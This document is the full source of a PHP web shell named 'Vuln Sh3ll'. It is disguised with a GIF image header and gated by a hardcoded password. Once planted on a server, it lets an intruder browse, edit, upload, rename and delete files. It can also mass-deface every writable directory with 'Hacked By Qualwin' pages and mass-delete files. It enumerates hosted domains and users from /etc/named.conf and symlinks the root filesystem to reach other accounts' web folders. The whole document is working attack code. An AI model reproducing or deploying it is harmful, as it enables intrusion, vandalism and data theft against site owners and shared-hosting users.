GIF89a;
<?php
 error_reporting(0);
 session_start();
 $yetki="securityt1";
 function serverip(){
 	$ip1=$_SERVER['SERVER_ADDR'];
 	$ip2=gethostbyname($_SERVER['HTTP_HOST']);
 	if($ip1 == $ip2){
 		return $ip1;
 	}else{
 		return $ip2;
 	}
 }
 function giris(){
 	global $yetki;
 	echo "<title>Vuln | Sh3ll</title>
 	<center><br><br><br><br>
 	<form action='' method='POST'>
 	Welcome to Vuln Sh3ll.<br><br>
 	<input type='password' name='sifre' value=''>
 	</form>";
 	if(isset($_POST['sifre'])){
 		if($_POST['sifre'] == $yetki){
 			$_SESSION['yonetici'] = "TRUE";
 			yonlendir('?home');
 		}else{
 			alert('Şifre yanlış laa :(');
 			yonlendir('?salak');
 		}
 	}
 }
 function write($content,$dir){
 	$fh=fopen($dir,"w");
 	if(fwrite($fh,$content)){
 		return "1";
 	}else{
 		return "0";
 	}
 	fclose($fh);
 }
function author(){
	print "</table><center><br><br><h3>Developed by Qualwin<br></b></h3><hr width='50%'><br><br>";
}
function delTree($dir){ 
$files = array_diff(scandir($dir), array('.', '..')); 
	foreach ($files as $file) { 
		(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
	}
	return rmdir($dir);
} 
function alert($msg){
	print "<script>alert('".$msg."');</script>";
}
function yonlendir($dir){
	print "<script>window.location='".$dir."';</script>";
}
if($_SESSION['yonetici'] == "TRUE"){
echo "<title>Vuln SH3LL</title>
<style>
@import url('https://fonts.googleapis.com/css?family=Supermercado+One');
* {margin: 0; padding: 0}
#wrapper {
    width: 900px;
    margin: auto;
    padding: 10px;
}
body {
    background: #D7DACC;
    font-family: arial;
}
table td{
	padding: 8px 8px;
}
h1 {
    text-align: center;
}

.text {
    position: relative;
    display: inline-block;
    font-size: 2rem;
    text-transform: uppercase;
    color: #244D49;
    text-shadow: 3px 3px 0px #D7DACC, 8px 8px 0px rgba(0, 0, 0, 0.1);
}
tr:hover{
background-color: gold;
text-shadow:0px 0px 10px ##339900;
}


</style>
<style>
a{
	color:white;
	text-decoration:none;
}
a:hover{
	color:blue;
}
#menu a{
        padding:7px 29px;
        margin:0;
        background:#222222;
        text-decoration:none;
        letter-spacing:1px;
        -moz-border-radius: 5px; -webkit-border-radius: 5px;
 -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
 color: gold;
 border-bottom:1px solid #333333;
 border-top:1px solid #333333;
 text-decoration: underline;
}
</style>
<style>
		body {
			background-color: red;
			background-size: 100% 100%;
			}
	</style>
<!--<body bgcolor='green'>-->
<font color='white'>
<link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
<center>";
$dir=$_GET['dir'];
if(!$dir){
	$dir=getcwd();
}
echo "<div id='wrapper'>
        <h1 class='text'>{ Vuln SH3LL }</h1>
    </div>
    <hr width='30%'>
    <br><br>
</center>
<i class='fa fa-hdd-o'></i> ".php_uname()."<br>
<i class='fa fa-desktop'></i> ".serverip()." | <i class='fa fa-user'></i> ".$_SERVER['REMOTE_ADDR']."<br>
<i class='fa fa-folder-o'></i> ";
$a=explode("/",$dir);
foreach($a as $aa => $aaa){
	if($aaa == '' && $aa == '0'){
		echo "<a href='?dir=/'>/</a>";
		continue;
	}elseif($aaa == ''){
		continue;
	}else{
		echo "<a href='?dir=";
		for($i=0;$i<=$aa;$i++){
			echo $a[$i]."/";
		}
		echo "'>$aaa</a>/";
	}
}
echo "<br><br>
<a href='?home'>Anasayfa</a> | <a href='?nf&dir=$dir'>Dosya Oluştur</a> | <a href='?nd&dir=$dir'>Dizin Oluştur</a> | <a href='?yukle'>Dosya Yükle</a> | <a href='?exit'>Çıkış Yap</a><br>";


$files = $_FILES['vulnfile']['name'];
	$dest = $dir.'/'.$files;
	if(isset($_POST['upload'])) {
	    if(is_writable($root)) {
	        if(@copy($_FILES['vulnfile']['tmp_name'], $dest)) {
	            $web = "http://".$_SERVER['HTTP_HOST']."/";
	            alert('Yükleme Başarılı!');
	        } else {
	            alert('Yükleme Başarısız');
	        }
	    } else {
	        if(@copy($_FILES['vulnfile']['tmp_name'], $dest)) {
	            alert('Yükleme Başarılı!');
	        } else {
	            alert('Yükleme Başarısız');
	        }
	    }
	}
if(isset($_GET['yukle'])){
echo "<form method='post' enctype='multipart/form-data'>
	      <input type='file' name='vulnfile'>
	      <input type='submit' name='upload' value='Yükle!'>
	      </form><br>";
}
if(isset($_GET['nf'])){
	echo "
	<form action='?nf&dir=$dir' method='POST'>
	Dosya ismi : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if($_POST['fok']){
		yonlendir("?edit=$dir/".$_POST['fname']."&dir=$dir");
	}
}elseif(isset($_GET['nd'])){
	echo "
	<form action='?nd&dir=$dir' method='POST'>
	Dizin ismi : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if($_POST['fok']){
		if(mkdir("$dir/".$_POST['fname']."")){
			echo "successfully created";
		}else{
			echo "Failed";
		}

	}
}elseif(isset($_GET['delf'])){
	if(delTree($_GET['delf'])){
		yonlendir("?dir=$dir");
	}else{
		alert('Failed.');
	}
}elseif(isset($_GET['renf'])){
	$now=$_GET['renf'];
	echo "
	<form action='?renf=$now&dir=$dir' method='POST'>
	New Name : <input type='text' name='fname'>
	<input type='submit' name='fok' value='Done'>
	</form>";
	if(isset($_POST['fok'])){
		$new=$_POST['fname'];
		if(rename($now,"$dir/$new")){
			alert('Değiştirildi!');
			header("Refresh: 1; url=?home");
		}else{
			alert('İzin Yetersiz!');
		}
	}
}elseif(isset($_GET['del'])){
	if(unlink($_GET['del'])){
		//alert("Başarıyla Silindi!");
		alert('Silindi!');
		header("Refresh: 1; url=?home");
		
	}else{
		//alert("Başarısız!");
		alert('İzin Yetersiz!');

	}
}elseif(isset($_GET['exit'])){
	session_destroy();
    header("Refresh: 1; url=?home");
	alert("Çıkış Yaptınız, Yönlendiriliyor!");
	
}elseif(isset($_GET['edit'])){
	$save=$_GET['edit'];
	$cont=htmlspecialchars(file_get_contents($save));
	echo "<form action='?edit=$save&$dir=$dir' method='POST'>
	<center><textarea name='fcont' cols=100% rows=30%>$cont</textarea><br><br>
	<input type='submit' name='pausiganteng' value='<<<<<<<<[ Save File ]>>>>>>>>'></center>
	</form><br><br>";
	author();
	if(isset($_POST['pausiganteng'])){
		if(write($_POST['fcont'],$save) == "1"){
			echo "<h3>Güncellendi!</h3>";
			alert('Güncellendi!');
		}else{
			alert('İzin yetersiz!');
			echo('İzin yetersiz!');
		}
	}
}elseif($_GET['mass'] == 'deface'){ //mass deface
	function mass($dir,$isim,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$konum = $dirc.'/'.$isim;
				if($dirb === '.') {
					file_put_contents($konum, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($konum, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#18BC9C>Tamamlandı!</font>] $konum<br>";
							file_put_contents($konum, $isi_script);
							$idx = mass($dirc,$isim,$isi_script);
						}
					}
				}
			}
		}
	}
	function mass_biasa($dir,$isim,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$konum = $dirc.'/'.$isim;
				if($dirb === '.') {
					file_put_contents($konum, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($konum, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#18BC9C>DONE</font>] $dirb/$isim<br>";
							file_put_contents($konum, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe'] == 'massal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe'] == 'biasa') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
		echo "<a href='?'><- kembali</a>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tip</font><br>
	<input type='radio' name='tipe' value='biasa' checked>Tekli<input type='radio' name='tipe' value='massal'>Çoklu<br><br>
	<font style='text-decoration: underline;'>Konum:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Dosya Adı:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>İndex kodu:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Qualwin</textarea><br>
	<input type='submit' name='start' value='Start!' style='width: 450px;' class='btn btn-success btn-sm'>
	</form>";

	}
}elseif($_GET['mass'] == 'delete') {
	function hapus_massal($dir,$isim) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$konum = $dirc.'/'.$isim;
				if($dirb === '.') {
					if(file_exists("$dir/$isim")) {
						unlink("$dir/$isim");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$isim")) {
						unlink("".dirname($dir)."/$isim");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($konum)) {
								echo "[<font color=#18BC9C>Silindi!</font>] $konum<br>";
								unlink($konum);
								$idx = hapus_massal($dirc,$konum);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
		echo "<a href='?home'>Başarılı!</a>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Konum:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Dosya Adı:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Goo!' style='width: 450px;'>
	</form>";
	}
}elseif(isset($_GET['sym'])) {
	if (!is_file('named.txt')) {
				
				$d00m = @file("/etc/named.conf");
				
			} else {
				
				$d00m = @file("named.txt");
				
				
			}
			if (!$d00m) {
				
				die("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
			} else {
				echo "<center><div class='tmp'><table align='center' width='40%' bgcolor='white'><td>Domains</td><td>Users</td><td>symlink </td>";
				foreach ($d00m as $dom) {
					
					if (eregi("zone", $dom)) {
						
						preg_match_all('#zone "(.*)"#', $dom, $domsws);
						
						flush();
						
						if (strlen(trim($domsws[1][0])) > 2) {
							
							$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domsws[1][0]));
							
							flush();
							
							
							
							$site = $user['name'];
							
							
							@symlink("/", "sym/root");
							
							$site = $domsws[1][0];
							
							$ir = 'ir';
							
							$il = 'il';
							
							if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
								$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $domsws[1][0] . "</div>";
							}
							
							
							echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www." . $domsws[1][0] . "/>" . $site . " </a> </div>
</td>


<td>
" . $user['name'] . "
</td>






<td>
<a href='sym/root/home/" . $user['name'] . "/public_html' target='_blank'>symlink </a>
</td>


</tr></div> </center>";
							
							
							flush();
							flush();
							
						}
					}
				}
			}
			
			


}elseif(isset($_GET['src'])){
	$cont=$_GET['src'];
	print "<div style='background-color: red;'><pre>".htmlspecialchars(file_get_contents($cont))."</pre></div>";
}else{

echo "<center>
<div id='menu'>
  <a href='?mass=deface'>Mass Deface</a>
  <a href='?mass=delete'>Mass Delete</a>
  <a href='?sym'>[ User & Domains & Symlink</a>
</div></center><br>
<table bgcolor='black' width='100%' style='color:red;' border='4' cellpadding='3' cellspacing='1' align='center'>
<tr>
<th width=50%>İsim</th>
<th width=30%>Tip / Boyut</th>
<th width=20%>İşlemler</th>
</tr>";
//scandir
$s=scandir($dir);
foreach($s as $fol){
	if($fol == "."){
		continue;
	}elseif($fol == ".."){
		print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td><td></td><tr>";
	}else{
		if(is_dir("$dir/$fol") == TRUE){
			print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td><center><td>Folder</td></center><td><a href='?delf=$dir$fol/&dir=$dir'><center>Sil</a> | <a href='?renf=$dir$fol/&dir=$dir'>Dizin Adı Değiştir</a></center></td><tr>";
	}
}
}
foreach($s as $file){
	if($file == "." || $file == ".."){
		continue;
	}else{
		  $size=filesize("$dir/$file")/1024;
		  $size = round($size,3);
		  if($size >= 1024){
    	  	$size = round($size/1024,2).' MB';
    	  }else{
  			$size = $size.' KB';
  		}if(is_file("$dir/$file") == TRUE){
			print "<tr><td><i class='fa fa-file-o'></i> <a href='?src=$dir/$file&dir=$dir'>$file</a></td><td>$size</td><td><center><a href='?edit=$dir/$file&dir=$dir'>Güncelle</a> | <a href='?del=$dir/$file&dir=$dir'>Sil</a> | <a href='?renf=$dir/$file&dir=$dir'>Dosya Adı Değiştir</a></td></tr></center>";
	}
}
}
  author();
}


}else{
	giris();
	$name=$_FILES['s']['name'];
	$tmp=$_FILES['s']['tmp_name'];
	if(copy($tmp,$name)){}else{
		print "Developed by Qualwin";
	}
}
?>